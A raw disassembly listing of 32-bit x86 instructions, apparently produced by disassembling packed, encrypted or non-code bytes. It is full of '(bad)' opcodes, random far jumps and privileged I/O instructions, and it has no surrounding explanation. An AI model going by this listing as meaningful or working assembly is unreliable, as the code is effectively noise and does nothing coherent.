  435552:	sbb    bh,bl
  435554:	fsubr  DWORD PTR [ecx-0x5c9619f1]
  43555a:	lahf   
  43555b:	retf   
  43555c:	dec    ebp
  43555d:	mov    al,ds:0xaa53929f
  435562:	pmaxub mm6,QWORD PTR [ebp-0x7d]
  435566:	lahf   
  435567:	stos   DWORD PTR es:[edi],eax
  435568:	dec    esi
  435569:	and    bh,dh
  43556b:	adc    DWORD PTR [edx-0x22],0xcf12ea06
  435572:	lods   al,BYTE PTR ds:[esi]
  435573:	out    dx,al
  435574:	mov    ebp,0x12e49f5f
  435579:	out    dx,eax
  43557a:	out    0xf2,eax
  43557c:	int3   
  43557d:	imul   BYTE PTR [edx-0x95fb09d]
  435583:	inc    ecx
  435584:	pusha  
  435585:	out    dx,al
  435586:	cld    
  435587:	in     eax,0x12
  435589:	iret   
  43558a:	mov    DWORD PTR [eax],esp
  43558c:	loop   0x43550f
  43558e:	pop    ds
  43558f:	imul   ebx,DWORD PTR [esi-0x51],0xffffff9e
  435593:	pop    ebx
  435594:	mov    ecx,0x5e007fc6
  435599:	aad    0x10
  43559b:	sub    ecx,DWORD PTR [ebx-0x47]
  43559e:	sets   BYTE PTR [ecx-0x753c15e4]
  4355a5:	sbb    al,0xea
  4355a7:	icebp  
  4355a8:	jnp    0x4355c6
  4355aa:	jmp    0x4830:0xea1c7bdd
  4355b1:	sbb    al,0xea
  4355b3:	push   ds
  4355b4:	dec    eax
  4355b5:	sbb    al,0xea
  4355b7:	je     0x4355f1
  4355b9:	sbb    al,0xea
  4355bb:	bound  edi,QWORD PTR [eax]
  4355bd:	sbb    al,0xea
  4355bf:	push   esi
  4355c0:	dec    eax
  4355c1:	sbb    al,0xea
  4355c3:	mov    ebx,0xebea1c48
  4355c8:	cmp    bl,BYTE PTR [edx+ebp*8]
  4355cb:	dec    esp
  4355cc:	cmp    ebx,DWORD PTR [ecx+eax*1]
  4355cf:	jmp    0xe98758b9
  4355d4:	das    
  4355d5:	add    al,BYTE PTR [ecx+ebp*8-0x13]
  4355d9:	add    al,BYTE PTR [ecx+ebp*8-0x3b]
  4355dd:	or     BYTE PTR [ecx+ebp*8-0x4e],al
  4355e1:	or     BYTE PTR [ecx+ebp*8-0x2b],al
  4355e5:	jmp    0x7c73f2d
  4355ea:	inc    esp
  4355eb:	jmp    0xe9875d2d
  4355f0:	add    eax,0xfde94407
  4355f5:	push   es
  4355f6:	inc    esp
  4355f7:	jmp    0xe9875d01
  4355fc:	add    ch,bh
  4355fe:	push   es
  4355ff:	inc    esp
  435600:	jmp    0xe9875d0a
  435605:	sbb    al,BYTE PTR [edi]
  435607:	inc    esp
  435608:	jmp    0xe9875d17
  43560d:	std    
  43560e:	push   es
  43560f:	inc    esp
  435610:	jmp    0xe9875dcf
  435615:	mov    edx,0xaae94407
  43561a:	pop    es
  43561b:	inc    esp
  43561c:	jmp    0xe9875dcb
  435621:	call   0x4407:0x9ae94407
  435628:	jmp    0xe9875b5f
  43562d:	cdq    
  43562e:	push   es
  43562f:	inc    esp
  435630:	jmp    0xe9875c90
  435635:	inc    ebp
  435636:	push   es
  435637:	inc    esp
  435638:	jmp    0xe9875cac
  43563d:	xchg   ecx,eax
  43563e:	push   es
  43563f:	inc    esp
  435640:	jmp    0xe9875cd5
  435645:	and    al,BYTE PTR [esi]
  435647:	inc    esp
  435648:	add    bl,bh
  43564a:	jg     0x435672
  43564c:	inc    ebx
  43564d:	sti    
  43564e:	fld    TBYTE PTR [ebx+eax*2]
  435651:	retf   
  435652:	dec    edi
  435653:	sub    DWORD PTR [ebx-0x35],eax
  435656:	scas   al,BYTE PTR es:[edi]
  435657:	xor    al,0x43
  435659:	mov    ebx,0xbb433294
  43565e:	out    0x1f,eax
  435660:	inc    ebx
  435661:	add    bl,cl
  435663:	add    BYTE PTR [eax],ah
  435665:	inc    ebx
  435666:	retf   
  435667:	sbb    BYTE PTR [edx],dh
  435669:	inc    ebx
  43566a:	mov    ebx,0xbb4330b9
  43566f:	sbb    eax,0x128b4339
  435674:	cmp    DWORD PTR [ebx-0x75],eax
  435677:	lahf   
  435678:	cmp    DWORD PTR [ebx+0x7b],eax
  43567b:	arpl   WORD PTR [eax],sp
  43567d:	inc    ebx
  43567e:	jnp    0x435650
  435680:	xor    DWORD PTR [ebx-0x75],eax
  435683:	cmp    DWORD PTR [ecx],0x30198b43
  435689:	inc    ebx
  43568a:	jnp    0x4356c3
  43568c:	xor    BYTE PTR [ebx+0x7b],al
  43568f:	test   DWORD PTR [eax],esp
  435691:	inc    ebx
  435692:	dec    ebx
  435693:	loop   0x4356cd
  435695:	inc    ebx
  435696:	dec    ebx
  435697:	inc    ebp
  435698:	sub    al,0x43
  43569a:	cmp    edx,DWORD PTR [edx+0x283b4334]
  4356a0:	sub    eax,0x2cf64b43
  4356a5:	inc    ebx
  4356a6:	dec    ebx
  4356a7:	(bad)  
  4356a8:	sub    al,0x43
  4356aa:	cmp    edx,DWORD PTR [ebx]
  4356ac:	sub    eax,0x2d873b43
  4356b1:	inc    ebx
  4356b2:	or     edi,DWORD PTR [edi-0xaf4bccd]
  4356b8:	xor    eax,DWORD PTR [ebx-0x5]
  4356bb:	sub    al,0x34
  4356bd:	inc    ebx
  4356be:	sti    
  4356bf:	sub    al,0x34
  4356c1:	inc    ebx
  4356c2:	(bad)  
  4356c3:	shr    BYTE PTR [esi+0x33],0x0
  4356c7:	mov    eax,ds:0xa1336ec0
  4356cc:	shl    BYTE PTR [ecx],0x52
  4356cf:	fnstenv [ecx-0x76]
  4356d2:	sbb    dl,ah
  4356d4:	add    DWORD PTR [ecx],0x74
  4356d7:	and    BYTE PTR [edi-0x889b5b3],dl
  4356dd:	mov    DWORD PTR [edi+0x597bdc38],edi
  4356e3:	mov    ch,0x4f
  4356e5:	xor    eax,0x10c1ba7d
  4356ea:	sub    edx,ebp
  4356ec:	ins    BYTE PTR es:[edi],dx
  4356ed:	add    al,0x0
  4356ef:	(bad)  
  4356f0:	fcompp 
  4356f2:	(bad)  
  4356f3:	push   ss
  4356f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4356f5:	add    eax,0xc7d9ddfe
  4356fb:	push   ss
  4356fc:	fnstsw WORD PTR [ebp+eiz*8+0x20c10e60]
  435703:	div    DWORD PTR [esi+ecx*4-0xb729c43]
  43570a:	test   BYTE PTR [eax+ebp*4],bl
  43570d:	loope  0x435758
  43570f:	push   esi
  435710:	inc    ebx
  435711:	fwait
  435712:	stc    
  435713:	xlat   BYTE PTR ds:[ebx]
  435714:	(bad)
  435717:	mov    ds:0x222d021b,al
  43571c:	sahf   
  43571d:	cmp    DWORD PTR [ebp+0x371e0091],edi
  435723:	mov    ds:0xbc0a0eb0,eax
  435728:	mov    DWORD PTR [ebx+0xe],eax
  43572b:	add    BYTE PTR [eax+ebp*4+0x2c55ff8e],dh
  435732:	or     al,0x2d
  435734:	and    al,BYTE PTR [ebx]
  435736:	mov    ?,edi
  435738:	pop    ebp
  435739:	sub    al,0x9c
  43573b:	call   0x9c22301c
  435740:	or     ebp,DWORD PTR [esi+0x18bdffc2]
  435746:	stos   DWORD PTR es:[edi],eax
  435747:	xor    eax,0x33300ca7
  43574c:	out    0x34,eax
  43574e:	push   es
  43574f:	clc    
  435750:	jg     0x43571c
  435752:	jb     0x435701
  435754:	cmp    BYTE PTR [ebx-0x18],al
  435757:	(bad)  
  435758:	adc    eax,0x86486110
  43575d:	aad    0xda
  43575f:	int3   
  435760:	fstp   st(5)
  435762:	add    BYTE PTR fs:[eax+ebx*1+0x1cddb963],al
  43576a:	mov    esi,0xefc176f3
  43576f:	xchg   ah,cl
  435771:	fsubr  st,st(1)
  435773:	add    esp,esp
  435775:	leave  
  435776:	(bad)  
  435777:	retf   0x528a
  43577a:	sbb    DWORD PTR [ebx-0x78a59e75],0xead6d488
  435784:	icebp  
  435785:	xor    bl,BYTE PTR [ebx]
  435787:	int    0x35
  435789:	repnz pop eax
  43578b:	adc    BYTE PTR [edi+0x5a],dl
  43578e:	inc    eax
  43578f:	lock add cl,dh
  435792:	shl    DWORD PTR [edi-0x2d4c2111],cl
  435798:	sbb    DWORD PTR [eax+ebx*2-0x102e02d8],edi
  43579f:	push   0xffffff9a
  4357a1:	ins    BYTE PTR es:[edi],dx
  4357a2:	sub    eax,0xd138868a
  4357a7:	xchg   ebp,eax
  4357a8:	rcr    esi,cl
  4357aa:	call   0xd6e9:0xd9627e01
  4357b1:	sbb    al,0xc1
  4357b3:	mov    ebp,0x159208e
  4357b8:	add    DWORD PTR [ebx],ebx
  4357ba:	sub    DWORD PTR [ecx+eiz*4],ebx
  4357bd:	pop    ebp
  4357be:	int    0x48
  4357c0:	pop    ebp
  4357c1:	sahf   
  4357c2:	and    DWORD PTR [ebp-0xd],ebp
  4357c5:	test   eax,0x53213b2d
  4357ca:	inc    ebx
  4357cb:	imul   esp,esp,0xffffffbc
  4357ce:	fld    TBYTE PTR [edx-0x13]
  4357d1:	mov    ah,0xd7
  4357d3:	push   0xffffffea
  4357d5:	or     al,0xb4
  4357d7:	push   0xffffffeb
  4357d9:	xchg   esi,eax
  4357da:	out    dx,al
  4357db:	inc    esp
  4357dc:	add    eax,0xf0027ca
  4357e1:	jmp    0xd2ae003
  4357e6:	iret   
  4357e7:	mov    ebp,DWORD PTR [edx+0x605f97c4]
  4357ed:	ins    DWORD PTR es:[edi],dx
  4357ee:	(bad)  
  4357ef:	std    
  4357f0:	mov    ecx,0x705f19a1
  4357f5:	add    BYTE PTR [ebp+0x62],bl
  4357f8:	dec    DWORD PTR [esi]
  4357fa:	int    0xb9
  4357fc:	mov    bl,BYTE PTR ds:0xf05ed082
  435802:	pusha  
  435803:	push   es
  435804:	retf   0x24a8
  435807:	out    dx,al
  435808:	push   esp
  435809:	or     eax,0xc782e16e
  43580e:	enter  0xf8b2,0x74
  435812:	and    eax,ecx
  435814:	test   BYTE PTR [ecx+0x5d],al
  435817:	sub    dl,BYTE PTR [ebx+0x6cdd603f]
  43581d:	std    
  43581e:	pop    eax
  43581f:	push   0x40
  435821:	cmc    
  435822:	ja     0x4357ff
  435824:	add    esp,DWORD PTR [edi+ecx*4]
  435827:	fst    DWORD PTR [eax+0x16]
  43582a:	xor    bl,BYTE PTR [eax+0xf]
  43582d:	test   eax,0xbd3661
  435832:	das    
  435833:	xchg   ecx,eax
  435834:	stc    
  435835:	dec    DWORD PTR [ebx]
  435837:	fdiv   DWORD PTR [edx+0xd]
  43583a:	fcom   DWORD PTR [edi-0x74d214bf]
  435840:	mov    edi,0xf9d43241
  435845:	call   FWORD PTR [edi+esi*8]
  435848:	jg     0x435891
  43584a:	or     DWORD PTR [ebp-0x13c2a048],ecx
  435850:	dec    ebp
  435851:	pop    ecx
  435852:	mov    ecx,0x505500e4
  435857:	cmp    DWORD PTR [eax-0x14],0xdcdf00
  43585e:	add    BYTE PTR [ebp+0x66],dh
  435861:	call   0xa9559e9
  435866:	test   BYTE PTR [ebx*8-0xc2b0000],ah
  43586d:	add    al,0x2
  43586f:	add    al,0xf4
  435871:	hlt    
  435872:	cmp    BYTE PTR [ebx-0x428bff29],0x5a
  435879:	dec    esp
  43587a:	cld    
  43587b:	jp     0x4358d9
  43587d:	mov    WORD PTR [eax-0x4],ds
  435880:	push   ecx
  435881:	cli    
  435882:	push   ecx
  435883:	leave  
  435884:	push   eax
  435885:	adc    al,0x44
  435887:	jne    0x4358a0
  435889:	add    DWORD PTR [ebp-0x7ceb36b5],eax
  43588f:	inc    ebx
  435890:	push   edx
  435891:	loopne 0x435875
  435893:	jnp    0x43586c
  435895:	add    BYTE PTR [ebp-0x72aeb4fa],cl
  43589b:	(bad)  
  43589c:	cmc    
  43589d:	stc    
  43589e:	(bad)  
  43589f:	jl     0x43588e
  4358a1:	inc    esi
  4358a2:	inc    DWORD PTR [esi-0x21]
  4358a5:	adc    al,BYTE PTR [eax+0x4b]
  4358a8:	xchg   cl,ah
  4358aa:	push   0x62
  4358ac:	mov    esi,0x2d6b6236
  4358b1:	xor    eax,0x7dc25f9
  4358b6:	daa    
  4358b7:	mov    BYTE PTR [edi+edi*2-0x6654497d],bh
  4358be:	stc    
  4358bf:	add    BYTE PTR [edx-0x4d1fc7eb],dh
  4358c5:	xor    BYTE PTR [edi],0x9
  4358c8:	arpl   WORD PTR [eax-0x740a3af1],cx
  4358ce:	jg     0x435853
  4358d0:	mov    BYTE PTR [ebx-0x2f6f0667],ah
  4358d6:	jg     0x43591b
  4358d8:	(bad)  
  4358d9:	shl    BYTE PTR [esp+ebp*2-0x1a669457],1
  4358e0:	sub    DWORD PTR [edx],ebx
  4358e2:	jle    0x43589f
  4358e4:	sub    bh,BYTE PTR [ebx-0x67]
  4358e7:	stc    
  4358e8:	push   ebp
  4358e9:	int    0x57
  4358eb:	push   dx
  4358ed:	cmp    eax,0x63ad6077
  4358f2:	cdq    
  4358f3:	push   eax
  4358f4:	xlat   BYTE PTR ds:[ebx]
  4358f5:	add    eax,0xfda4509d
  4358fa:	or     DWORD PTR [edx+ecx*4],eax
  4358fd:	test   ch,0xf9
  435900:	lea    edx,ds:0x3b855677
  435906:	cdq    
  435907:	dec    esi
  435908:	adc    al,BYTE PTR [ebp+0x37]
  43590b:	lock adc bl,BYTE PTR [eax]
  43590e:	fcmovnb st,st(4)
  435910:	ins    DWORD PTR es:[edi],dx
  435911:	and    esp,DWORD PTR [ebp+0x7fbbf815]
  435917:	inc    ebx
  435918:	inc    edx
  435919:	xchg   BYTE PTR [eax+edx*2],al
  43591c:	push   ebp
  43591d:	xchg   ebp,eax
  43591e:	sbb    BYTE PTR [edx],dl
  435920:	mov    ds:0xc47dc0,al
  435925:	push   esi
  435926:	fst    DWORD PTR [edi]
  435928:	outs   dx,BYTE PTR ds:[esi]
  43592a:	fmul   DWORD PTR [ebp-0x20e3dffa]
  435930:	jmp    DWORD PTR [edx]
  435932:	sbb    al,0x6
  435934:	cmc    
  435935:	and    eax,0x67aceab2
  43593a:	fwait
  43593b:	popf   
  43593c:	or     BYTE PTR ds:0x6097a59b,dl
  435942:	fldl2t 
  435944:	add    ebx,esp
  435946:	sbb    esi,edx
  435948:	mov    esp,DWORD PTR [ecx-0x16ffac1c]
  43594e:	sbb    ebx,esi
  435950:	xor    ebx,ecx
  435952:	sbb    esp,DWORD PTR [esi-0x11e3dfcc]
  435958:	add    BYTE PTR [eax-0x35fc17e5],ah
  43595e:	mov    ebp,0x5dcb97a4
  435963:	sbb    eax,0xe6994798
  435968:	xor    ebp,ecx
  43596a:	or     esi,DWORD PTR [esi+0x3bc0a88b]
  435970:	aaa    
  435971:	test   al,0xb1
  435973:	fcmovne st,st(4)
  435975:	ficomp WORD PTR [eax+0x5ddd70ef]
  43597b:	test   eax,0xe2969d36
  435980:	add    ecx,DWORD PTR ds:0x62006ec5
  435986:	fnstcw WORD PTR [edx+0x5e100030]
  43598c:	pop    ecx
  43598d:	das    
  43598e:	(bad)  [esi+eax*1]
  435991:	in     al,dx
  435992:	test   DWORD PTR [esi+0x2e],ebx
  435995:	xchg   edi,eax
  435996:	imul   esp,ebp,0x30
  435999:	fcomp  DWORD PTR [edi-0x20]
  43599c:	dec    ebp
  43599d:	lds    eax,FWORD PTR [edi+0x7b9a0194]
  4359a3:	mov    al,0x85
  4359a5:	xchg   ebp,eax
  4359a6:	and    eax,0x1db589d2
  4359ab:	in     eax,dx
  4359ac:	mov    ebp,DWORD PTR [edi]
  4359ae:	push   es
  4359af:	push   ds
  4359b0:	push   edi
  4359b1:	pop    ss
  4359b2:	aad    0x55
  4359b4:	rcr    esi,0xa5
  4359b7:	cs add ebp,ecx
  4359ba:	popa   
  4359bb:	push   edi
  4359bc:	cmp    eax,0xc15d04c5
  4359c1:	out    0x8d,al
  4359c3:	sub    al,BYTE PTR [ebx]
  4359c5:	jmp    0xa9f23c2b
  4359ca:	xor    BYTE PTR [ecx],cl
  4359cc:	xchg   BYTE PTR [ebp+0x15],dh
  4359cf:	pop    ecx
  4359d0:	add    ebp,ecx
  4359d2:	popa   
  4359d3:	push   esi
  4359d4:	mov    ecx,0xc6f71302
  4359da:	pop    ebp
  4359db:	cdq    
  4359dc:	or     BYTE PTR [ebp-0x73],ah
  4359df:	scas   eax,DWORD PTR es:[edi]
  4359e0:	clc    
  4359e1:	jmp    0x580c54a
  4359e6:	mov    ch,0xb5
  4359e8:	or     esi,DWORD PTR [ecx]
  4359ea:	sahf   
  4359eb:	push   esp
  4359ec:	std    
  4359ed:	push   0xd96300
  4359f2:	sbb    eax,0x14c15c27
  4359f7:	rcl    BYTE PTR [esi-0x34],1
  4359fa:	adc    esp,DWORD PTR [ebx+0x11]
  4359fd:	push   esp
  4359fe:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  435a00:	jb     0x435a00
  435a02:	jne    0x435a65
  435a04:	fld    DWORD PTR [edi]
  435a06:	and    eax,0xf60337c5
  435a0b:	sub    al,0x99
  435a0d:	push   esi
  435a0e:	jo     0x435a45
  435a10:	cmc    
  435a11:	and    BYTE PTR [edx+ebx*8+0x2e051d15],bh
  435a18:	or     edi,eax
  435a1a:	add    BYTE PTR [esi],bh
  435a1c:	xchg   esp,eax
  435a1d:	adc    al,BYTE PTR [eax+0x4b]
  435a20:	xchg   ebx,eax
  435a21:	ret    
  435a22:	movsx  esi,BYTE PTR [esi+esi*8+0x2fce3bff]
  435a2a:	jl     0x435a5b
  435a2c:	test   al,0x73
  435a2e:	adc    bl,BYTE PTR [ebx+0x390cdfd5]
  435a34:	fadd   QWORD PTR [eax]
  435a36:	lea    eax,[edi+0xb027890]
  435a3c:	fdivr  st(5),st
  435a3e:	(bad)  
  435a3f:	jo     0x435a53
  435a41:	es leave 
  435a43:	jmp    0x4d60:0xeb57fd01
  435a4a:	and    al,0x3b
  435a4c:	(bad)  
  435a4d:	retf   
  435a4e:	mov    BYTE PTR [edi],dh
  435a50:	mov    ecx,0xe100e818
  435a55:	out    0xfa,eax
  435a57:	(bad)  
  435a58:	jg     0x4359ef
  435a5a:	or     al,BYTE PTR [edx+ebp*4+0x4b0000db]
  435a61:	rcr    DWORD PTR [eax+ecx*2],1
  435a64:	mov    esi,0xbad683d4
  435a69:	fild   DWORD PTR [eax]
  435a6b:	test   BYTE PTR [edi+0x4f012cb9],0xd7
  435a72:	rol    DWORD PTR [edi+ebx*4-0xd],0x11
  435a77:	add    BYTE PTR [ebx-0x50938025],bh
  435a7d:	out    0xdd,eax
  435a7f:	or     al,0x12
  435a81:	add    DWORD PTR ds:0x1d18bc58,ebx
  435a87:	pop    esp
  435a88:	lods   al,BYTE PTR ds:[esi]
  435a89:	fild   DWORD PTR [eax]
  435a8b:	add    BYTE PTR [ebp+ebx*1+0x3d],dh
  435a8f:	and    al,0xb0
  435a91:	pusha  
  435a92:	sub    al,0xfc
  435a94:	bound  esi,QWORD PTR [edx-0x6ceffbc]
  435a9a:	mov    edi,esi
  435a9c:	enter  0x8b90,0x7c
  435aa0:	jle    0x435a4e
  435aa2:	cmp    cl,BYTE PTR [eax+0x5d]
  435aa5:	cmp    al,0xd4
  435aa7:	inc    BYTE PTR [ebp-0x3f]
  435aaa:	dec    esp
  435aab:	dec    eax
  435aac:	mov    dh,0x73
  435aae:	dec    esp
  435aaf:	or     edi,ebx
  435ab1:	cmp    eax,0x71620004
  435ab6:	xor    cl,BYTE PTR [ebx-0x6b6b3200]
  435abc:	add    BYTE PTR [edx-0x40],ah
  435abf:	mov    edx,ecx
  435ac1:	or     ch,BYTE PTR [edi+0x2f]
  435ac4:	cli    
  435ac5:	or     eax,0xde09bd3d
  435aca:	and    eax,0xa620003
  435acf:	frstor [ebp+0x6a]
  435ad2:	pop    edi
  435ad4:	inc    edi
  435ad5:	ins    DWORD PTR es:[edi],dx
  435ad6:	cld    
  435ad7:	cld    
  435ad8:	clc    
  435ad9:	(bad)  
  435adb:	pushf  
  435adc:	xchg   DWORD PTR [esi-0x24],ebx
  435adf:	aam    0x82
  435ae1:	aad    0xbf
  435ae3:	js     0x435aff
  435ae5:	arpl   ax,ax
  435ae7:	add    al,0x66
  435ae9:	ins    DWORD PTR es:[edi],dx
  435aea:	enter  0x102a,0x44
  435aee:	sub    ebp,esi
  435af0:	push   edi
  435af1:	adc    bh,BYTE PTR ds:0xc0be2478
  435af7:	add    al,0x0
  435af9:	adc    cl,BYTE PTR ds:0xb68b0835
  435aff:	add    eax,DWORD PTR [eax]
  435b01:	(bad)  
  435b03:	sub    bh,bh
  435b05:	fmulp  st(4),st
  435b07:	loopne 0x435b21
  435b09:	(bad)  [esi-0x54]
  435b0c:	hlt    
  435b0d:	push   ds
  435b0e:	fstp   DWORD PTR [edi-0x6c]
  435b11:	ficomp WORD PTR [ecx-0x27b88019]
  435b17:	jmp    0xfe59371f
  435b1c:	in     al,dx
  435b1d:	add    cl,ah
  435b1f:	cwde   
  435b20:	out    dx,eax
  435b21:	jg     0x435b9e
  435b23:	fsubr  st,st(1)
  435b25:	add    edi,DWORD PTR [edi-0x60]
  435b28:	fisttp WORD PTR [ebp+0x22]
  435b2b:	or     BYTE PTR [edx-0xe0b297a],bl
  435b31:	push   DWORD PTR ds:0x3ac573ae
  435b37:	mov    ds:0x552b95ae,al
  435b3c:	sub    al,BYTE PTR [esi+eiz*8]
  435b3f:	(bad)  
  435b41:	add    esp,DWORD PTR [edx-0x22]
  435b44:	das    
  435b45:	aas    
  435b46:	inc    esi
  435b47:	(bad)  
  435b48:	mov    edx,0xde5cdaca
  435b4d:	add    esp,DWORD PTR [esi-0x27]
  435b50:	jmp    0x2e38f9d5
  435b55:	xor    al,0x9d
  435b57:	or     BYTE PTR [ebp-0x78],bl
  435b5a:	ds fstp st(5)
  435b5d:	add    esp,DWORD PTR [edx+0x9]
  435b60:	jno    0x435ba2
  435b62:	jle    0x435b99
  435b64:	mov    bh,0xf9
  435b66:	sbb    edi,eax
  435b68:	sub    DWORD PTR [ecx+eiz*8],eax
  435b6b:	cwde   
  435b6c:	inc    BYTE PTR cs:[edi-0x2b]
  435b70:	inc    ecx
  435b71:	jle    0x435b0d
  435b73:	mov    edi,0xd962047c
  435b78:	fidivr DWORD PTR [esp+ebx*8+0x46406387]
  435b7f:	add    eax,0xe00bd65
  435b84:	retf   0x59e6
  435b87:	int3   
  435b88:	popa   
  435b89:	add    DWORD PTR ds:0x283a10da,ebp
  435b8f:	push   0x25
  435b91:	and    al,0x72
  435b93:	aaa    
  435b94:	int    0x7d
  435b96:	xor    BYTE PTR [ebx-0x5b],cl
  435b99:	imul   DWORD PTR [ebx]
  435b9b:	fisub  WORD PTR [esi+0x3413db03]
  435ba1:	std    
  435ba2:	mov    al,ds:0x9d8991d7
  435ba7:	inc    ebp
  435ba8:	(bad)
  435bab:	cmp    eax,0x1d4f809
  435bb0:	leave  
  435bb1:	inc    eax
  435bb2:	jmp    0xb8cf848b
  435bb7:	xor    DWORD PTR [esi+0x4a],edx
  435bba:	icebp  
  435bbb:	leave  
  435bbc:	or     cl,0xe
  435bbf:	icebp  
  435bc0:	push   esi
  435bc1:	stc    
  435bc2:	jo     0x435c36
  435bc4:	cmc    
  435bc5:	cmp    BYTE PTR [ecx+esi*8+0x28],ah
  435bc9:	std    
  435bca:	cmp    DWORD PTR [edi-0x4a],ebx
  435bcd:	rol    BYTE PTR [ebx+0x205f04f8],1
  435bd3:	imul   ebp,DWORD PTR [eax],0x55261ad4
  435bd9:	inc    eax
  435bda:	icebp  
  435bdb:	data16 sbb bh,ch
  435bde:	rcr    DWORD PTR [esi],0x1d
  435be1:	imul   ebp,ebp,0xffffff89
  435be4:	or     DWORD PTR [esi+0x40ba0015],eax
  435bea:	mov    WORD PTR [edi-0x50ab2e17],fs
  435bf0:	rcl    BYTE PTR [ebp-0x3f],1
  435bf3:	sbb    eax,0x130d336d
  435bf8:	scas   al,BYTE PTR es:[edi]
  435bf9:	mov    cl,0x2e
  435bfb:	and    DWORD PTR [ecx+0x15],edx
  435bfe:	add    DWORD PTR [esi+0xf956da],ecx
  435c04:	adc    bl,ah
  435c06:	sbb    al,0x38
  435c08:	push   es
  435c09:	inc    edi
  435c0a:	je     0x435c14
  435c0c:	dec    eax
  435c0d:	aad    0x88
  435c0f:	pop    esp
  435c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435c11:	rcr    ch,0x18
  435c14:	xchg   ecx,eax
  435c15:	(bad)  
  435c16:	pop    eax
  435c17:	push   0xffffff87
  435c19:	add    al,BYTE PTR [eax-0x74174cf9]
  435c1f:	inc    esp
  435c20:	addr16 int 0x50
  435c23:	lea    eax,[esp+edx*8]
  435c26:	push   eax
  435c27:	call   0x3dc989
  435c2c:	dec    eax
  435c2d:	cwde   
  435c2e:	push   ecx
  435c2f:	push   0x49
  435c31:	add    BYTE PTR [ecx-0x73],dl
  435c34:	div    DWORD PTR [ebx+0x507d8b54]
  435c3a:	lds    ebx,FWORD PTR [ebx+0x4d]
  435c3d:	inc    edi
  435c3e:	jge    0x435c00
  435c40:	mul    BYTE PTR [ebx+0x7273cf7d]
  435c46:	ret    0xcff
  435c49:	test   DWORD PTR [eax-0x1712ffa1],edi
  435c4f:	dec    ebp
  435c50:	add    DWORD PTR [edi+0x44],0x950bfffd
  435c57:	mov    dl,0x1
  435c59:	xchg   DWORD PTR [esi+0xa],edi
  435c5c:	test   DWORD PTR [edi+0x250000de],esi
  435c62:	cs cmp eax,0x7fff8f24
  435c68:	inc    edi
  435c69:	mov    ecx,0x5744b2d8
  435c6e:	lock dec eax
  435c70:	cmova  edi,ebx
  435c73:	add    al,BYTE PTR [eax]
  435c75:	retf   
  435c76:	out    dx,eax
  435c77:	or     DWORD PTR [edx+ecx*2+0x620000d4],eax
  435c7e:	cli    
  435c7f:	sbb    BYTE PTR [eax],cl
  435c81:	loop   0x435d01
  435c83:	or     ah,bh
  435c85:	cmp    bh,BYTE PTR [esp+eax*1-0x2be3600]
  435c8c:	jmp    DWORD PTR [edx+0x39]
  435c8f:	dec    ecx
  435c90:	and    al,0x2
  435c92:	cmp    DWORD PTR [ecx+0x24],ecx
  435c95:	adc    ah,BYTE PTR ds:0x72022449
  435c9b:	ja     0x435ce1
  435c9d:	ds xchg esi,eax
  435c9f:	xor    al,0x52
  435ca1:	pop    ebp
  435ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435ca3:	cld    
  435ca4:	adc    DWORD PTR [edx+0x5dc07fc0],esp
  435caa:	xor    eax,0xc06202cc
  435caf:	ja     0x435cf5
  435cb1:	add    BYTE PTR [esi-0x2174cbb0],al
  435cb7:	pushf  
  435cb8:	cmp    ch,0x2d
  435cbb:	shl    DWORD PTR [edx+edx*2],0x25
  435cbf:	scas   al,BYTE PTR es:[edi]
  435cc0:	inc    eax
  435cc1:	adc    ah,BYTE PTR [edx+0x65c07fc0]
  435cc7:	cmp    eax,0xc06202e8
  435ccc:	push   ss
  435ccd:	adc    DWORD PTR [ecx+edi*1+0x49],edi
  435cd1:	and    al,0x8c
  435cd3:	dec    eax
  435cd4:	sub    dh,BYTE PTR [edi]
  435cd6:	sahf   
  435cd7:	fcom   QWORD PTR [ebx+esi*2]
  435cda:	pop    edi
  435cdb:	iret   
  435cdc:	mov    esp,0x7cdcde87
  435ce1:	add    BYTE PTR [edx-0x40],ah
  435ce4:	jnp    0x435d2a
  435ce6:	jle    0x435cec
  435ce8:	js     0x435d36
  435cea:	xchg   BYTE PTR [eax],cl
  435cec:	xchg   ebp,eax
  435ced:	(bad)  
  435cef:	bound  edx,QWORD PTR [ecx-0x332bd979]
  435cf5:	jl     0x435cb1
  435cf7:	fstp   DWORD PTR [esi-0x21411a00]
  435cfd:	add    esp,DWORD PTR [edx+0x41]
  435d00:	jmp    0x435d05
  435d02:	popf   
  435d03:	stos   BYTE PTR es:[edi],al
  435d04:	add    al,0xfc
  435d06:	call   0x76d9:0x261131e4
  435d0d:	mov    dh,0xdf
  435d0f:	shl    DWORD PTR [ebp-0x62],0xf1
  435d13:	fnstsw WORD PTR [edx]
  435d15:	add    al,BYTE PTR [eax]
  435d17:	jmp    0xde97:0x84ec060d
  435d1e:	add    esp,DWORD PTR [edx-0x56]
  435d21:	(bad)  
  435d22:	out    0x89,eax
  435d24:	pop    esi
  435d25:	scas   al,BYTE PTR es:[edi]
  435d26:	out    0x91,eax
  435d28:	out    0x29,al
  435d2a:	xor    esp,edi
  435d2c:	call   0x842f:0xaa4ecd52
  435d33:	cmp    bl,al
  435d35:	(bad)  
  435d36:	xchg   bl,ch
  435d38:	aam    0xe9
  435d3a:	add    ebp,DWORD PTR [edi+0x2ae7be1d]
  435d40:	push   esi
  435d41:	pop    esi
  435d42:	out    0x61,eax
  435d44:	fsubr  st,st(1)
  435d46:	add    ebx,DWORD PTR [ebx]
  435d48:	aas    
  435d49:	in     al,dx
  435d4a:	aam    0x24
  435d4c:	adc    DWORD PTR [ecx-0x120b2186],ebx
  435d52:	add    ah,BYTE PTR [edx-0x27]
  435d55:	bound  eax,QWORD PTR [edi+0x3e]
  435d58:	in     eax,0x38
  435d5a:	jge    0x435d42
  435d5c:	hlt    
  435d5d:	icebp  
  435d5e:	add    al,0x62
  435d60:	fnstcw WORD PTR [eax]
  435d62:	and    esi,0x6204ddf4
  435d68:	fstp   DWORD PTR [ecx]
  435d6a:	xor    eax,0x37fe1ce5
  435d6f:	fstp   QWORD PTR [ecx+eax*1]
  435d72:	or     eax,0x545527e
  435d77:	xchg   edx,eax
  435d78:	push   edx
  435d79:	lods   eax,DWORD PTR ds:[esi]
  435d7a:	int    0x0
  435d7c:	mov    cl,0xaa
  435d7e:	clc    
  435d7f:	jmp    0xfd282358
  435d84:	and    ecx,ebx
  435d86:	jge    0x435d31
  435d88:	xchg   ebp,eax
